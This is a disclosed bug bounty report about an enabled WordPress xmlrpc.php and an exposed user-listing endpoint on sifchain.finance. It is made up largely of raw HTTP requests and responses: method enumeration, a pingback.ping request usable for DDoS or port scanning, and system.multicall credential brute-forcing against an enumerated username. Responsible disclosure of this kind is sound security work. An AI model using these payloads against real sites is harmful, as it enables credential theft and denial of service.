# xmlrpc.php And /wp-json/wp/v2/users FILE IS enable it will used for bruteforce attack and denial of service

## Report Details
- **Report ID**: 1147449
- **URL**: https://hackerone.com/reports/1147449
- **State**: Closed
- **Severity**: none
- **Submitted**: 2021-04-03T10:11:00.327Z
- **Disclosed**: 2021-05-06T14:46:35.002Z

## Reporter
- **Username**: malagham
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: sifchain

## Vulnerability Information
Hi Team :)
i am abbas heybati ;)

## Summary:

After reviewing the given scope, I realized that the main domain "http://sifchain.finance"  has several vulnerabilities that I will report to you as a scenario. I realize that I have reported to you outside of Scope. The report is related to the mentioned company and the vulnerability can endanger your business. I consider it my duty to report this vulnerability to you.

###  the XML-RPC interface opens two kinds of attacks:

https://sifchain.finance/xmlrpc.php

- XML-RPC pingbacks
- Brute force attacks via XML-RPC

###And in the  /wp-json/wp/v2/users path, it reveals all the user information
- https://sifchain.finance/wp-json/wp/v2/users

## Steps To Reproduce:

1. For the two vulnerabilities listed above in the xmlrpc.php section, first post a request to xmlrpc.php for `<methodName> system.listMethods </methodName>`
given

### Post Request:

```
POST /xmlrpc.php HTTP/1.1
Host: sifchain.finance
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: __cfduid=dcb7a4e2b0f6a7042e39b0bd33aa4128a1617428272
Upgrade-Insecure-Requests: 1
Content-Length: 135


<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall> 
```

### Response:
```
HTTP/1.1 200 OK
Date: Sat, 03 Apr 2021 05:49:32 GMT
Content-Type: text/xml; charset=UTF-8
Connection: close
Strict-Transport-Security: max-age=15552000; includeSubDomains
Vary: Accept-Encoding
X-hacker: If you're reading this, you should visit automattic.com/jobs and apply to join the fun, mention this header.
Host-Header: WordPress.com
X-ac: 2.hhn _atomic_ams
CF-Cache-Status: DYNAMIC
cf-request-id: 0937e09a790000063171828000000001
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 63a003a3fc550631-FRA
Content-Length: 4653



<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>prli.api_version</string></value>
  <value><string>prli.get_pretty_link_url</string></value>
  <value><string>prli.get_link_from_slug</string></value>
  <value><string>prli.get_link</string></value>
  <value><string>prli.get_all_links</string></value>
  <value><string>prli.get_all_groups</string></value>
  <value><string>prli.create_pretty_link</string></value>
  <value><string>demo.addTwoNumbers</string></value>
  <value><string>demo.sayHello</string></value>
  <value><string>pingback.extensions.getPingbacks</string></value>
  <value><string>pingback.ping</string></value>
  <value><string>mt.publishPost</string></value>
  <value><string>mt.getTrackbackPings</string></value>
  <value><string>mt.supportedTextFilters</string></value>
  <value><string>mt.supportedMethods</string></value>
  <value><string>mt.setPostCategories</string></value>
  <value><string>mt.getPostCategories</string></value>
  <value><string>mt.getRecentPostTitles</string></value>
  <value><string>mt.getCategoryList</string></value>
  <value><string>metaWeblog.getUsersBlogs</string></value>
  <value><string>metaWeblog.deletePost</string></value>
  <value><string>metaWeblog.newMediaObject</string></value>
  <value><string>metaWeblog.getCategories</string></value>
  <value><string>metaWeblog.getRecentPosts</string></value>
  <value><string>metaWeblog.getPost</string></value>
  <value><string>metaWeblog.editPost</string></value>
  <value><string>metaWeblog.newPost</string></value>
  <value><string>blogger.deletePost</string></value>
  <value><string>blogger.editPost</string></value>
  <value><string>blogger.newPost</string></value>
  <value><string>blogger.getRecentPosts</string></value>
  <value><string>blogger.getPost</string></value>
  <value><string>blogger.getUserInfo</string></value>
  <value><string>blogger.getUsersBlogs</string></value>
  <value><string>wp.restoreRevision</string></value>
  <value><string>wp.getRevisions</string></value>
  <value><string>wp.getPostTypes</string></value>
  <value><string>wp.getPostType</string></value>
  <value><string>wp.getPostFormats</string></value>
  <value><string>wp.getMediaLibrary</string></value>
  <value><string>wp.getMediaItem</string></value>
  <value><string>wp.getCommentStatusList</string></value>
  <value><string>wp.newComment</string></value>
  <value><string>wp.editComment</string></value>
  <value><string>wp.deleteComment</string></value>
  <value><string>wp.getComments</string></value>
  <value><string>wp.getComment</string></value>
  <value><string>wp.setOptions</string></value>
  <value><string>wp.getOptions</string></value>
  <value><string>wp.getPageTemplates</string></value>
  <value><string>wp.getPageStatusList</string></value>
  <value><string>wp.getPostStatusList</string></value>
  <value><string>wp.getCommentCount</string></value>
  <value><string>wp.deleteFile</string></value>
  <value><string>wp.uploadFile</string></value>
  <value><string>wp.suggestCategories</string></value>
  <value><string>wp.deleteCategory</string></value>
  <value><string>wp.newCategory</string></value>
  <value><string>wp.getTags</string></value>
  <value><string>wp.getCategories</string></value>
  <value><string>wp.getAuthors</string></value>
  <value><string>wp.getPageList</string></value>
  <value><string>wp.editPage</string></value>
  <value><string>wp.deletePage</string></value>
  <value><string>wp.newPage</string></value>
  <value><string>wp.getPages</string></value>
  <value><string>wp.getPage</string></value>
  <value><string>wp.editProfile</string></value>
  <value><string>wp.getProfile</string></value>
  <value><string>wp.getUsers</string></value>
  <value><string>wp.getUser</string></value>
  <value><string>wp.getTaxonomies</string></value>
  <value><string>wp.getTaxonomy</string></value>
  <value><string>wp.getTerms</string></value>
  <value><string>wp.getTerm</string></value>
  <value><string>wp.deleteTerm</string></value>
  <value><string>wp.editTerm</string></value>
  <value><string>wp.newTerm</string></value>
  <value><string>wp.getPosts</string></value>
  <value><string>wp.getPost</string></value>
  <value><string>wp.deletePost</string></value>
  <value><string>wp.editPost</string></value>
  <value><string>wp.newPost</string></value>
  <value><string>wp.getUsersBlogs</string></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>

```
2.XML-RPC pingbacks attacks

In this case, an attacker is able to leverage the default XML-RPC API in order to perform callbacks for the following purposes:

- Distributed denial-of-service (DDoS) attacks - An attacker executes the pingback.ping the method from several affected WordPress installations against a single unprotected target (botnet level).
- XSPA (Cross Site Port Attack) - An attacker can execute the pingback.ping the method from a single affected WordPress installation to the same host (or other internal/private host) on different ports. An open port or an internal host can be determined by observing the difference in time of response and/or by looking at the response of the request.

### Post Request:
```
POST /xmlrpc.php HTTP/1.1
Host: sifchain.finance
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: __cfduid=dcb7a4e2b0f6a7042e39b0bd33aa4128a1617428272
Upgrade-Insecure-Requests: 1
Content-Length: 285



<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>https://your server target </string></value>
</param>
<param>
<value><string>https://sifchain.finance</string></value>
</param>
</params>
</methodCall>
```

### Response:

```
HTTP/1.1 200 OK
Date: Sat, 03 Apr 2021 05:58:08 GMT
Content-Type: text/xml; charset=UTF-8
Connection: close
Strict-Transport-Security: max-age=15552000; includeSubDomains
Vary: Accept-Encoding
X-hacker: If you're reading this, you should visit automattic.com/jobs and apply to join the fun, mention this header.
Host-Header: WordPress.com
X-ac: 2.hhn _atomic_ams
CF-Cache-Status: DYNAMIC
cf-request-id: 0937e87a5500002b4d4c323000000001
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 63a0103d5b352b4d-FRA
Content-Length: 394


<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>0</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>Invalid discovery target</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```
3.Brute force attacks XML-RPC

Sometimes the only way to bypass request limiting or blocking in a brute force attack against WordPress site is to use the all too forgotten XML-RPC API.
In this section, we use the wp / v2 / users path that I mentioned at the beginning of the report.
Here we have found the users from the said path and use them in this section.(The user used in this section is ==asha8fd635db6e9==, which is a report from the first section.)
"The above request can be sent in Burp Intruder (for example) with different sets of credentials. Note that, even if you guess the password or not, the response code will always be 200. "
"WordPress XML-RPC by default allows an attacker to perform a single request, and brute force hundreds of passwords."


### Post Request:
```
POST /xmlrpc.php HTTP/1.1
Host: sifchain.finance
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: __cfduid=dcb7a4e2b0f6a7042e39b0bd33aa4128a1617428272
Upgrade-Insecure-Requests: 1
Content-Length: 243


<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>asha8fd635db6e9</value></param> 
<param><value>password</value></param> 
</params> 
</methodCall>
```

### Response:
```
HTTP/1.1 403 Forbidden
Date: Sat, 03 Apr 2021 05:51:33 GMT
Content-Type: text/xml; charset=UTF-8
Connection: close
Strict-Transport-Security: max-age=15552000; includeSubDomains
Vary: Accept-Encoding
X-hacker: If you're reading this, you should visit automattic.com/jobs and apply to join the fun, mention this header.
Host-Header: WordPress.com
X-XMLRPC-Error-Code: 403
X-ac: 2.hhn _atomic_ams
CF-Cache-Status: DYNAMIC
cf-request-id: 0937e272350000dfb7e0b9c000000001
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 63a00696bd19dfb7-FRA
Content-Length: 403



<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>403</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>Incorrect username or password.</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```
### The following request requires permissions for both system.multicall and wp.getUsersBlogs methods:

### Post Request:
```
POST /xmlrpc.php HTTP/1.1
Host: sifchain.finance
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: __cfduid=dcb7a4e2b0f6a7042e39b0bd33aa4128a1617428272
Upgrade-Insecure-Requests: 1
Content-Length: 1592


<?xml version="1.0"?>
<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>
<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>
<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>
<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>
<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>
</data></array></value></param></params></methodCall>
```
### Response:
```
HTTP/1.1 200 OK
Date: Sat, 03 Apr 2021 09:47:13 GMT
Content-Type: text/xml; charset=UTF-8
Connection: close
Strict-Transport-Security: max-age=15552000; includeSubDomains
Vary: Accept-Encoding
X-hacker: If you're reading this, you should visit automattic.com/jobs and apply to join the fun, mention this header.
Host-Header: WordPress.com
X-XMLRPC-Error-Code: 403
X-ac: 2.hhn _atomic_ams
CF-Cache-Status: DYNAMIC
cf-request-id: 0938ba358200004e9daebe8000000001
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 63a15fcf3b654e9d-FRA
Content-Length: 1043


<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>faultCode</name><value><int>403</int></value></member>
  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
</struct></value>
  <value><struct>
  <member><name>faultCode</name><value><int>403</int></value></member>
  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
</struct></value>
  <value><struct>
  <member><name>faultCode</name><value><int>403</int></value></member>
  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
</struct></value>
  <value><struct>
  <member><name>faultCode</name><value><int>403</int></value></member>
  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```
## Supporting Material/References:
1) https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/
2) https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html
3)  https://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html

### Reference Hackerone Reports: #325040 #448524 #448524 #752073

## Impact

1)This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.
2) This method is also used for brute force attacks to stealing the admin credentials and other important credentials

Plus, there are a lot of PoCs lying around the web concerning the vulnerabilities associated with XMLRPC.php in wordpress websites

## Attachments
- Capture2.JPG
- Capture.JPG
- Capture3.JPG
- Capture4.JPG
- Capture5.JPG
- poc-video.mp4
